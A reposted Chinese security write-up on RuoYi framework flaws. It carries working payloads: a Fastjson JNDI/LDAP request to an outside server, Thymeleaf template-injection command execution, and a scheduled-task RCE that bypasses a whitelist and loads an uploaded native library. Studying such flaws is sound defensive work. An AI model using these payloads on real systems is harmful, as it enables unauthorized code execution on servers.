![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmpw7k4JMTMeibYOYye0b2veFttlibDyLdcXKfiajL8kHHMPYg7mBvDg66A/640?wx_fmt=png&from=appmsg "")  
  
开启 autotype  
```
params[@type]=org.apache.shiro.jndi.JndiObjectFactory&params[resourceName]=ldap://192.168.12.76:1389/09rlhv

```  
## ruoyi4.2.0  
  
初看这个数据包一堆参数，有点复杂，根据之前的分析梳理一下，需要的参数是 tplCategory  
为tree  
，才能走到fastjson漏洞点  
,认真梳理一下需要的参数，发现还需要treeCode&treeParentCode  
参数，这块代码中全局搜索提示的缺少的内容的中文名称即可发现参数名称，填写上即可。  
  
最终简化后的数据包如下  
```
POST /tool/gen/edit HTTP/1.1
Host: 172.16.0.66
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Referer: http://172.16.0.66/tool/gen/edit/6
Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://172.16.0.66Accept-Language: zh-CN,zh;q=0.9Content-Length: 3610tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={"@type":"java.net.Inet4Address","val":"11.hb4r0s.dnslog.cn"}
```  
# 0x08 SSTI模版注入漏洞  
#### 漏洞版本  
  
在4.7.1版本CacheController类中  
![[../S24-25赛季-大黑客之路/红队知识学习/assets/Y10 若依ruoyi/file-20250416135654610.png]]  
#### 漏洞复现  
  
模板注入漏洞payload：  
  
return内容可控：  
```
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}::.x

```  
  
URL路径可控：  
```
${T(java.lang.Runtime).getRuntime().exec("touch test")}::.x

```  
  
测试上述payload发现返回包返回500，具体情况是Thymeleaf3.0.12  
版本对这个版本进行了一些先知，防止模板注入漏洞，https://github.com/thymeleaf/thymeleaf/issues/809  
以下为防护的情况：  
  
我们将Payload改造一下，如${T (java.lang.Runtime).getRuntime().exec("calc.exe")}  
。在T和(之间多加几个空格即可，放入数据包中进行测试发现成功弹出计算器。  
  
这里为了方便演示，payload  
直接贴出来了，大家测试的时候记得进行URL  
编码。  
```
POST /monitor/cache/getNames HTTP/1.1

fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.x

```  
```
cacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}

```  
#### 接口/monitor/cache/getKeys  
#### 接口/monitor/cache/getValue  
#### 接口/demo/form/localrefresh/task  
# 0x09 若依4.8.0版本计划任务RCE  
### 环境搭建  
  
https://github.com/yangzongzhuan/RuoYi/releases  
  
导入数据库，修改application-druid中的数据库账号密码  
  
修改application中的文件路径及log存放路径  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmTCx6LjmOGocl77htjIvfKvQnCOTxGYmZAvm1dVGicsKLwRaj8GdxyXQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm4XaBPH2YbCsDibGcib0nEnRnZmrfdVUYOicibPdFzLkS1kGkMoqkOWAIYQ/640?wx_fmt=png&from=appmsg "")  
  
启动成功  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmZGACXKSVhrgHrJQHKjkPo1GEkbz5NvOp05lZwhw19icHhLDsskwck9Q/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
最新版本4.8 Ruoyi 后台⽬前限制  
- **规则**  
：invokeTarget  
 必须包含 com.ruoyi.quartz.task  
 字符串。  
  
-   
- **子字符串匹配漏洞**  
：白名单检查使用 StringUtils.containsAnyIgnoreCase  
，只要 invokeTarget  
 中**任意位置**  
包含白名单字符串即可，无需完全匹配包名。  
  
- **构造畸形类名**  
：例如 xxx.com.ruoyi.quartz.task.yyy.EvilClass  
，虽然实际包名不在白名单内，但字符串包含 com.ruoyi.quartz.task  
，可绕过白名单。  
  
- **绕过思路**  
：  
  
```
/**       * 定时任务白名单配置（仅允许访问的包名，如其他需要可以自行添加）       */
publicstaticfinalString[] JOB_WHITELIST_STR = { "com.ruoyi.quartz.task" };  

/**       * 定时任务违规的字符       */
publicstaticfinalString[] JOB_ERROR_STR = { "java.net.URL", "javax.naming.InitialContext", "org.yaml.snakeyaml",  
"org.springframework", "org.apache", "com.ruoyi.common.utils.file", "com.ruoyi.common.config", "com.ruoyi.generator" };  
}

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmupNoXHFGbK3I6tR8L3gp9ygfKOhScEt9DKOgh2ANvyNs3ibmdqMOicIw/640?wx_fmt=png&from=appmsg "")  
  
JOB_WHITELIST_STR 这个也就是com.ruoyi.quartz.task 其实不⽤类名 包含在⾃符串⾥⾯就⾏ 这⾥是invokeTarget⽽不是beanPackageName  
- **规则**  
：禁止使用 java.net.URL  
、org.springframework  
 等敏感包下的类。  
  
-   
- **寻找非黑名单类**  
：利用若依自身依赖或第三方库中未被黑名单覆盖的类。例如：  
  
- **工具类**  
：若依的 com.ruoyi.common.utils  
 下的某些工具类（需确认是否在 JOB_ERROR_STR  
 禁止的子包中）。  
  
- **绕过思路**  
：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmImYJOMYZTbfqLq8RHuWCD3EibWpicFbLDfRnEzHTSC2Vr8ouafiby2QQw/640?wx_fmt=png&from=appmsg "")  
  
**白名单检查（whiteList 方法）**  
```
publicstaticboolean whiteList(String invokeTarget)  
    {  
String packageName = StringUtils.substringBefore(invokeTarget, "(");  
int count = StringUtils.countMatches(packageName, ".");  
if (count > 1)  
        {  
return StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR);  
        }  
Object obj = SpringUtils.getBean(StringUtils.split(invokeTarget, ".")[0]);  
String beanPackageName = obj.getClass().getPackage().getName();  
return StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR)  
                && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR);  
    }  
}

```  
- **漏洞点**  
：当 invokeTarget  
 的包层级超过1层时（如 a.b.c.method  
），仅检查是否包含白名单字符串，而非完整包路径。  
  
然后不⽤JOB_ERROR_STR 这个类⾥⾯的 从mvn install 后 从其他包下⾯去寻找可利⽤的类下的⽅法就⾏  
  
需要满⾜以下条件**方法参数解析（getMethodParams）**  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmMib1NaTA7lbPlGMnyoaQn1pWHHOKBnN4zIHWHLhibHxwhkKZ5UIIUucA/640?wx_fmt=png&from=appmsg "")  
```
publicstaticList<Object[]> getMethodParams(String invokeTarget)  
{  
String methodStr = StringUtils.substringBetween(invokeTarget, "(", ")");  
if (StringUtils.isEmpty(methodStr))  
    {  
returnnull;  
    }  
String[] methodParams = methodStr.split(",(?=([^\"']*[\"'][^\"']*[\"'])*[^\"']*$)");  
List<Object[]> classs = new LinkedList<>();  
for (int i = 0; i < methodParams.length; i++)  
    {  
String str = StringUtils.trimToEmpty(methodParams[i]);  
// String字符串类型，以'或"开头  
if (StringUtils.startsWithAny(str, "'", "\""))  
        {  
            classs.add(newObject[] { StringUtils.substring(str, 1, str.length() - 1), String.class });  
        }  
// boolean布尔类型，等于true或者false  
elseif ("true".equalsIgnoreCase(str) || "false".equalsIgnoreCase(str))  
        {  
            classs.add(newObject[] { Boolean.valueOf(str), Boolean.class });  
        }  
// long长整形，以L结尾  
elseif (StringUtils.endsWith(str, "L"))  
        {            classs.add(newObject[] { Long.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Long.class });  
        }  
// double浮点类型，以D结尾  
elseif (StringUtils.endsWith(str, "D"))  
        {  
            classs.add(newObject[] { Double.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Double.class });  
        }  
// 其他类型归类为整形  
else
        {  
            classs.add(newObject[] { Integer.valueOf(str), Integer.class });  
        }  
    }  
return classs;  
}

```  
- **限制**  
：参数类型被强制约束为基本类型，无法传递复杂对象。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmUeo66bBLekhuoKtQgXe5z8hGOnSnvJwYmXRZXqicFGmzWNWTpoSFrKQ/640?wx_fmt=png&from=appmsg "")  
```
/**   * 执行方法   *   * @param sysJob 系统任务   */
publicstaticvoid invokeMethod(SysJob sysJob) throws Exception
{  
String invokeTarget = sysJob.getInvokeTarget();  
String beanName = getBeanName(invokeTarget);  
String methodName = getMethodName(invokeTarget);  
List<Object[]> methodParams = getMethodParams(invokeTarget);  

if (!isValidClassName(beanName))  
    {  
Object bean = SpringUtils.getBean(beanName);  
        invokeMethod(bean, methodName, methodParams);  
    }  
else
    {  
Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();  
        invokeMethod(bean, methodName, methodParams);  
    }  
}

```  
  
传递的参数只能是其中的这些类型 通过 , 进⾏分割。substringBetween获取的是() ⾥⾯ 不能继续包含 )了会截断  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmIk9KtX2DUYibENemSxEMLDtkwBV0oibV5PdfaEsNSO6WbAQibjlHfjDyQ/640?wx_fmt=png&from=appmsg "")  
```
publicstaticString substringBetween(finalString str, finalString open, finalString close) {  
if (!ObjectUtils.allNotNull(str, open, close)) {  
returnnull;  
    }  
finalint start = str.indexOf(open);  
if (start != INDEX_NOT_FOUND) {  
finalint end = str.indexOf(close, start + open.length());  
if (end != INDEX_NOT_FOUND) {  
return str.substring(start + open.length(), end);  
        }  
    }  
returnnull;  
}

```  
  
那我们可以直接去找String 可控到sink 的类就可以了。  
  
这⾥反射的时候还需要注意 需要满⾜ 存在⼀个参构造 且都是public的  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmMth9GtcJrHKMCEicMHTNgDFspa3xsKFkPC1ib2WzjJV2zuczIwiaSkOjQ/640?wx_fmt=png&from=appmsg "")  
```
Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();

```  
#### 计划任务分析  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm8VZV7lDHN1icZK0CGZjDTlz2rfAMs0Y0kcyFicAAzAb9QIJlVvpANLwg/640?wx_fmt=png&from=appmsg "")  
  
根据提交数据包锁定后端路由  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm8G5IyuHwky1dQra5I2cSloSX0q9GxUib570qEHlW6HhRpj8iaVwgdB4A/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmG4jpyshoBGRmLib6PFHZ6Ru8tHMNzeeiaXPPYjBwnyNhlpWzXqy8N4HA/640?wx_fmt=png&from=appmsg "")  
  
调试看一下具体做了什么  
  
前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmQdzibQt5yV8npBicPztKiaNK4G9ibvS5Bbv9ia4zfuDAWs89GJyy2GasoYw/640?wx_fmt=png&from=appmsg "")  
  
还判断了是否有一些黑名单中的类  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmcmoQpv5AwnxF8MhUjThXs6G9MuFPuk0BDWAdOBUKLsCQKyvuib8c20w/640?wx_fmt=png&from=appmsg "")  
  
进入白名单的判断  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmHUbgK3UKlicmRr8SKiclUHrSj4MLVxQoEMddtLic0SuNqZtXrSe6kvd0A/640?wx_fmt=png&from=appmsg "")  
  
提取出调用的类名，判断其中是否包含白名单字符串  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmS1M1pdwTibRslSObflGbzzrlNJcEeTtUzx0BH0aurxLLD4Htpdeo1Gw/640?wx_fmt=png&from=appmsg "")  
  
白名单字符串为com.ruoyi.quartz.task  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmrKMhsuz0hT3VSP66QjtVibeLsK9bJHib648PM6KjziaoeQ0NNaFO9IMhQ/640?wx_fmt=png&from=appmsg "")  
  
注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmWb9jGRwAibs0AE8BgwWaic3nqLJaP0uLiaErWpV7nCNuxgOLzXEUgENsg/640?wx_fmt=png&from=appmsg "")  
  
后续就会进入正常的j保存计划任务流程  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmSFF1Y9qib8CkrvxLR65ApXjZyVC1RFOnetz6ibxMMLq4byABybez16vw/640?wx_fmt=png&from=appmsg "")  
  
当启动任务时，会调用方法  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmcsuugicvcuib1bNIqUFbribGfYyvo79w1zdNibh5sVLO1OJ8gmRAO2lgPg/640?wx_fmt=png&from=appmsg "")  
  
获取需要调用的类名方法名参数值  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmdg0biaicVfTBiafIEzIrQahVnKKneQORAbc3MAGQrrlsJwjGB9LCIficjA/640?wx_fmt=png&from=appmsg "")  
  
在获取方法参数时进行了处理，只允许为字符串/布尔/长整/浮点/整形，无法传递类对象  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm3obh4tyD8dOcovmThSedFFXEZvHFCR8X1gD8GfGhKPibewBr13FQaGQ/640?wx_fmt=png&from=appmsg "")  
  
接着会实例化该类，反射调用其方法  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmxQTF1cCwbN5mrQAFOrbaCuv0WuzdBaZRBuu9gwIDzuJiauTNuvcS6XA/640?wx_fmt=png&from=appmsg "")  
  
该方法为public修饰  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmrq7GIuM5DuY9N7P8Cet6kFXAY7XHUjYvKOI3kjq3AHMOr9lr9EVEgA/640?wx_fmt=png&from=appmsg "")  
  
我们想要利用需要达成的是  
- 使用的类不在黑名单中  
  
- 要存在com.ruoyi.quartz.task字符串  
  
- 不可以使用rmi ldap http协议  
  
#### 文件上传  
  
而在ruoyi中存在一个文件上传点  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmzKeycSBdw4BCsI1oN5zph8BX0OAsicDHrCg1LEWtnOhWQdMzhq2BWpQ/640?wx_fmt=png&from=appmsg "")  
  
我们可以随便上传一个文件看看  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmSRu9orgEF48p956cfVn4RIRk4I2h9DVutB4IUV8o1ZOs7XMibvzg7FA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm2KNydRXlhTLbd1MLY7y4RKexXFRU0DUCOPFP5QG4TekqbFtcyB5ORw/640?wx_fmt=png&from=appmsg "")  
  
那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmfic9LQ34N5r0mlkDq8bvBibTwBJ3d66Qj4CtXI3R5KXS7w9UZCeNfNvw/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的<font style="color:rgba(0, 0, 0, 0.85);">构造函数</font>  
  
而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm80Wy1P9j5kyyTiajpiaXZ6Czgrb94OIDhgfsrIUcDPAVg51vMkn9xPCg/640?wx_fmt=png&from=appmsg "")  
```
POST /common/upload HTTP/1.1
Host: 10.40.107.67
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpgsuccess--00content0boundary00--
```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm7I4Zwz5FnhOj7icLkfnq9plDpNVZt2TdrVztWoRWvNjoLGNmreKSf9w/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmAibVZpwxnspTkMzrESvalic2zUSibibdsnOOc01IdZHk1iaYQFYJLah8R7A/640?wx_fmt=png&from=appmsg "")  
```
cat calc.c 

#include <stdlib.h>
__attribute__((constructor))
staticvoid run() {
system("open -a Calculator");
}

```  
```
POST /common/upload HTTP/1.1
Host: 10.40.107.67
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpg二进制恶意代码--00content0boundary00--
```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm4EJWMAyNu9BaUhjWO8ebuPUwgq1ReWXoqbsIy4NZdHiaQHAoZoe9Yzw/640?wx_fmt=png&from=appmsg "")  
  
注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题  
  
  
原文链接：https://forum.butian.net/share/4328，如有侵权请联系删除，谢谢。  
  
